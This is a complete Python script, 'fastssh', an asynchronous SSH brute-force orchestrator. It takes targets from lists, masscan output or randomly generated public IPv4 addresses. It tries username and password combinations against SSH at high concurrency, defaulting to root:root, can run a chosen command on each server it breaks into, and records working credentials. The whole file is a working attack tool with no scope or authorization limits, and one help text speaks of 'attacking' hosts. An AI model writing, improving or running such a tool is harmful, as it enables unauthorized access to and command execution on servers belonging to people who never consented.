#!/usr/bin/env python3
"""
fastssh - async SSH discovery and credential testing orchestrator.

Key ideas:
- Prefer external high-speed scanners (masscan/zmap) and ingest their JSON.
- Use async TCP probes to skip dead hosts before brute attempts.
- Async SSH auth attempts with tight concurrency and stop-after-first options.
- Structured JSONL output for easy parsing/resume.
"""

import argparse
import asyncio
import ipaddress
import json
import os
import random
import contextlib
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple

try:
    import orjson  # type: ignore
except ImportError:
    orjson = None

import asyncssh


# -----------------------------------------------------------------------------
# Data classes and helpers
# -----------------------------------------------------------------------------


@dataclass
class Config:
    targets: Dict[str, Set[int]] = field(default_factory=dict)
    combos: List[Tuple[str, str]] = field(default_factory=list)
    connect_timeout: float = 3.0
    auth_timeout: float = 5.0
    read_timeout: float = 3.0
    max_workers: int = 200
    queue_size: int = 10000
    stop_first_host: bool = False
    stop_first_global: bool = False
    command: Optional[str] = None
    command_output: bool = True
    capture_banner: bool = False
    probe: bool = True
    shuffle: bool = True
    results_path: Path = Path("results.jsonl")
    log_interval: float = 5.0
    hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
    verbose: bool = False


@dataclass
class WorkItem:
    host: str
    port: int
    user: str
    password: str


@dataclass
class HostState:
    stop: asyncio.Event = field(default_factory=asyncio.Event)
    banner: Optional[str] = None


def load_lines(path: Path) -> List[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except OSError as exc:
        raise SystemExit(f"Failed to read {path}: {exc}") from exc


def parse_target(line: str, default_port: int = 22) -> Tuple[str, List[int]]:
    host = line.strip()
    if not host:
        return "", []
    if ":" in host:
        base, ports_raw = host.split(":", 1)
        ports = [int(p) for p in ports_raw.split(",") if p]
        ports = ports or [default_port]
        return base, ports
    return host, [default_port]


def collect_targets(args: argparse.Namespace) -> Dict[str, Set[int]]:
    targets: Dict[str, Set[int]] = {}

    def add_target(host: str, ports: Iterable[int]) -> None:
        if not host:
            return
        targets.setdefault(host, set()).update(ports)

    # Inline targets
    for t in args.target or []:
        host, ports = parse_target(t, args.port)
        add_target(host, ports)

    # File-based targets
    if args.targets:
        for line in load_lines(Path(args.targets)):
            host, ports = parse_target(line, args.port)
            add_target(host, ports)

    # masscan JSON ingestion
    if args.masscan_json:
        try:
            data = json.loads(Path(args.masscan_json).read_text())
        except (OSError, json.JSONDecodeError) as exc:
            raise SystemExit(f"Failed to load masscan JSON: {exc}") from exc
        if isinstance(data, dict):
            data = [data]
        for entry in data:
            ip = entry.get("ip")
            for port_info in entry.get("ports", []):
                if port_info.get("status") != "open":
                    continue
                add_target(ip, [int(port_info.get("port", args.port))])

    # Random public IPv4 generation
    for _ in range(args.random or 0):
        ip = ipaddress.ip_address(".".join(str(random.randint(0, 255)) for _ in range(4)))
        if ip.is_private or ip.is_loopback or ip.is_multicast:
            continue
        add_target(str(ip), [args.port])

    if not targets:
        raise SystemExit("No targets provided.")

    return targets


def load_creds(args: argparse.Namespace) -> List[Tuple[str, str]]:
    combos: Set[Tuple[str, str]] = set()

    # combo file: user:pass per line
    if args.combo_file:
        for line in load_lines(Path(args.combo_file)):
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            combos.add((user, pwd))

    users: List[str] = []
    passwords: List[str] = []

    if args.user_file:
        users.extend(load_lines(Path(args.user_file)))
    if args.users:
        users.extend(args.users)
    if not users:
        users = ["root"]

    if args.pass_file:
        passwords.extend(load_lines(Path(args.pass_file)))
    if args.passwords:
        passwords.extend(args.passwords)
    if not passwords and not combos:
        passwords = ["root"]

    if not combos:
        for u in users:
            for p in passwords:
                combos.add((u, p))

    return list(combos)


def dumps_json(record: dict) -> str:
    if orjson:
        return orjson.dumps(record).decode()
    return json.dumps(record, ensure_ascii=False)


# -----------------------------------------------------------------------------
# Networking helpers
# -----------------------------------------------------------------------------


async def probe_port(host: str, port: int, timeout: float) -> Optional[str]:
    """
    TCP probe to check reachability and optionally grab the SSH banner.
    """
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
        banner = None
        try:
            banner = await asyncio.wait_for(reader.read(128), timeout=timeout)
            banner = banner.decode(errors="ignore").strip()
        except Exception:
            banner = None
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
        return banner
    except Exception:
        return None


# -----------------------------------------------------------------------------
# Brute engine
# -----------------------------------------------------------------------------


async def attempt_login(
    item: WorkItem,
    cfg: Config,
    host_state: HostState,
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
) -> None:
    if global_stop.is_set() or host_state.stop.is_set():
        return

    try:
        conn = await asyncssh.connect(
            item.host,
            port=item.port,
            username=item.user,
            password=item.password,
            known_hosts=None,
            client_keys=[],
            login_timeout=cfg.auth_timeout,
            connect_timeout=cfg.connect_timeout,
            compression_algs=["none"],
        )
    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError) as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] auth failed {item.host}:{item.port} {item.user}:{item.password} ({exc})", flush=True)
        return
    except OSError as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] connection error {item.host}:{item.port} ({exc})", flush=True)
        return
    except Exception as exc:
        async with stats_lock:
            stats["errors"] += 1
            stats["last_progress"] = time.monotonic()
        print(f"[error] unexpected error before auth {item.host}:{item.port}: {exc}", flush=True)
        return

    async with conn:
        record = {
            "host": item.host,
            "port": item.port,
            "user": item.user,
            "password": item.password,
        }

        if cfg.command:
            try:
                result = await asyncio.wait_for(conn.run(cfg.command, check=False), timeout=cfg.read_timeout)
                if cfg.command_output:
                    record["command"] = cfg.command
                    record["stdout"] = result.stdout
                    record["stderr"] = result.stderr
            except Exception as exc:
                record["command"] = cfg.command
                record["stdout"] = ""
                record["stderr"] = f"<command error: {exc}>"

        if host_state.banner:
            record["banner"] = host_state.banner

        async with file_lock:
            cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
            with cfg.results_path.open("a", encoding="utf-8") as f:
                f.write(dumps_json(record) + "\n")

        async with stats_lock:
            stats["successes"] += 1
            stats["last_progress"] = time.monotonic()

        if cfg.stop_first_host:
            host_state.stop.set()
        if cfg.stop_first_global:
            global_stop.set()


async def worker(
    queue: "asyncio.Queue[Optional[WorkItem]]",
    cfg: Config,
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            return

        if global_stop.is_set() or host_states[item.host].stop.is_set():
            async with stats_lock:
                stats["skipped"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()
            continue

        async with stats_lock:
            stats["active"] += 1
        try:
            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock)
        except Exception as exc:
            async with stats_lock:
                stats["errors"] += 1
                stats["last_progress"] = time.monotonic()
            print(f"[error] worker crash avoided for {item.host}:{item.port}: {exc}", flush=True)
        finally:
            async with stats_lock:
                stats["active"] = max(0, stats["active"] - 1)
                stats["attempts"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()


# -----------------------------------------------------------------------------
# Orchestration
# -----------------------------------------------------------------------------


async def build_queue(
    cfg: Config,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
) -> None:
    hosts = list(cfg.targets.items())
    combos = list(cfg.combos)
    if cfg.shuffle:
        random.shuffle(hosts)
        random.shuffle(combos)

    try:
        for host, ports in hosts:
            host_states.setdefault(host, HostState())
            port_list = list(ports)
            if cfg.shuffle:
                random.shuffle(port_list)
            for port in port_list:
                for user, pwd in combos:
                    if global_stop.is_set():
                        break
                    await queue.put(WorkItem(host, port, user, pwd))
    finally:
        for _ in range(cfg.max_workers):
            await queue.put(None)


async def probe_targets(cfg: Config, host_states: Dict[str, HostState]) -> None:
    if not cfg.probe:
        return
    print("[info] Probing targets...", flush=True)
    filtered: Dict[str, Set[int]] = {}
    tasks = []
    for host, ports in cfg.targets.items():
        for port in ports:
            tasks.append((host, port))

    sem = asyncio.Semaphore(cfg.max_workers)
    results: Dict[Tuple[str, int], Optional[str]] = {}

    async def one(host: str, port: int) -> None:
        async with sem:
            banner = await probe_port(host, port, cfg.connect_timeout)
            results[(host, port)] = banner

    await asyncio.gather(*(one(h, p) for h, p in tasks))

    for (host, port), banner in results.items():
        if banner is not None:
            filtered.setdefault(host, set()).add(port)
            if cfg.capture_banner:
                host_states.setdefault(host, HostState()).banner = banner

    cfg.targets = filtered
    if not cfg.targets:
        raise SystemExit("No live SSH targets after probing.")
    print(f"[info] Probe complete. Live hosts: {len(cfg.targets)}", flush=True)


def count_work_items(cfg: Config) -> int:
    return sum(len(ports) * len(cfg.combos) for ports in cfg.targets.values())


def drain_queue(queue: "asyncio.Queue[Optional[WorkItem]]") -> None:
    # Best-effort empty to accelerate shutdown on hang/stop.
    try:
        while True:
            item = queue.get_nowait()
            queue.task_done()
            if item is None:
                queue.put_nowait(item)
    except asyncio.QueueEmpty:
        return


async def progress_reporter(
    cfg: Config,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    stop: asyncio.Event,
    global_stop: asyncio.Event,
) -> None:
    start_time = time.monotonic()

    async def snapshot(now: float) -> str:
        async with stats_lock:
            attempts = int(stats.get("attempts", 0))
            successes = int(stats.get("successes", 0))
            failures = int(stats.get("failures", 0))
            errors = int(stats.get("errors", 0))
            skipped = int(stats.get("skipped", 0))
            active = int(stats.get("active", 0))
            total = int(stats.get("total", 0))
            last_progress = stats.get("last_progress", start_time)
        elapsed = now - start_time
        idle = now - last_progress if last_progress else 0.0
        done = attempts + skipped
        pending = max(total - done, 0)
        rate = attempts / elapsed if elapsed > 0 else 0.0
        success_rate = successes / attempts if attempts else 0.0
        qsize = queue.qsize()
        lines = [
            "[status]",
            f"  elapsed: {elapsed:.1f}s | rate: {rate:.2f}/s | idle: {idle:.1f}s",
            f"  queue: {qsize} | pending-est: {pending} | active: {active}/{cfg.max_workers}",
            f"  attempts: {attempts}/{total} | successes: {successes} | failures: {failures} | skipped: {skipped} | errors: {errors}",
            f"  success-rate: {success_rate:.2%}",
        ]
        return "\n".join(lines)

    # Print immediately so users see status even before the first interval elapses.
    print(await snapshot(time.monotonic()), flush=True)

    while not stop.is_set():
        await asyncio.sleep(cfg.log_interval)
        now = time.monotonic()
        print(await snapshot(now), flush=True)

        async with stats_lock:
            idle = now - stats.get("last_progress", start_time)
            pending_now = max(stats.get("total", 0) - (stats.get("attempts", 0) + stats.get("skipped", 0)), 0)
        if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
            print(
                f"[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
                flush=True,
            )
            stop.set()
            global_stop.set()
            drain_queue(queue)


async def run(cfg: Config) -> None:
    host_states: Dict[str, HostState] = {}
    await probe_targets(cfg, host_states)

    queue_size = max(0, cfg.queue_size)
    queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=queue_size)
    global_stop = asyncio.Event()
    file_lock = asyncio.Lock()
    stats_lock = asyncio.Lock()
    stats: Dict[str, float] = {
        "attempts": 0,
        "successes": 0,
        "failures": 0,
        "skipped": 0,
        "errors": 0,
        "active": 0,
        "total": count_work_items(cfg),
        "last_progress": time.monotonic(),
    }

    workers = [
        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock))
        for _ in range(cfg.max_workers)
    ]
    reporter_stop = asyncio.Event()
    reporter = asyncio.create_task(progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop))

    print("[info] Building work queue...", flush=True)
    await build_queue(cfg, queue, host_states, global_stop)
    print("[info] Work queue built, processing...", flush=True)
    await queue.join()
    global_stop.set()
    reporter_stop.set()
    await reporter
    for w in workers:
        w.cancel()
    with contextlib.suppress(Exception):
        await asyncio.gather(*workers)


# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="fast SSH credential testing orchestrator")
    p.add_argument("--target", action="append", help="host or host:ports (comma-separated)")
    p.add_argument("--targets", help="file with host[:ports] per line")
    p.add_argument("--masscan-json", help="masscan JSON output to ingest")
    p.add_argument("--random", type=int, default=0, help="generate N random public IPv4s")
    p.add_argument("--port", type=int, default=22, help="default port when none given")

    p.add_argument("--users", nargs="+", help="usernames")
    p.add_argument("--user-file", help="file with usernames")
    p.add_argument("--passwords", nargs="+", help="passwords")
    p.add_argument("--pass-file", help="file with passwords")
    p.add_argument("--combo-file", help="file with user:pass per line")

    p.add_argument("--max-workers", type=int, default=200, help="parallel SSH attempts")
    p.add_argument("--queue-size", type=int, default=10000, help="max queued attempts")
    p.add_argument("--connect-timeout", type=float, default=3.0)
    p.add_argument("--auth-timeout", type=float, default=5.0)
    p.add_argument("--read-timeout", type=float, default=3.0)
    p.add_argument("--log-interval", type=float, default=5.0, help="seconds between progress prints")
    p.add_argument("--hang-timeout", type=float, default=60.0, help="seconds with no progress before hang stop (0 to disable)")

    p.add_argument("--command", help="run this command on success")
    p.add_argument("--no-command-output", action="store_true", help="suppress command stdout/stderr in logs")
    p.add_argument("--stop-first-host", action="store_true", help="stop attacking a host after first success")
    p.add_argument("--stop-first-global", action="store_true", help="stop all work after first success")
    p.add_argument("--no-probe", action="store_true", help="skip TCP probe step")
    p.add_argument("--banner", action="store_true", help="capture SSH banner during probe")
    p.add_argument("--no-shuffle", action="store_true", help="disable randomization of attempts")
    p.add_argument("--results", default="results.jsonl", help="path to JSONL output")
    p.add_argument("--verbose", action="store_true", help="print per-attempt warnings/errors")
    return p


def main(argv: Optional[Sequence[str]] = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    cfg = Config(
        targets=collect_targets(args),
        combos=load_creds(args),
        connect_timeout=args.connect_timeout,
        auth_timeout=args.auth_timeout,
        read_timeout=args.read_timeout,
        max_workers=args.max_workers,
        queue_size=args.queue_size,
        stop_first_host=args.stop_first_host,
        stop_first_global=args.stop_first_global,
        command=args.command,
        command_output=not args.no_command_output,
        capture_banner=args.banner,
        probe=not args.no_probe,
        shuffle=not args.no_shuffle,
        results_path=Path(args.results),
        log_interval=args.log_interval,
        hang_timeout=args.hang_timeout,
        verbose=args.verbose,
    )

    try:
        asyncio.run(run(cfg))
    except KeyboardInterrupt:
        print("Interrupted, exiting.")
    except Exception as exc:
        print(f"[fatal] Unhandled error: {exc}")


if __name__ == "__main__":
    main()
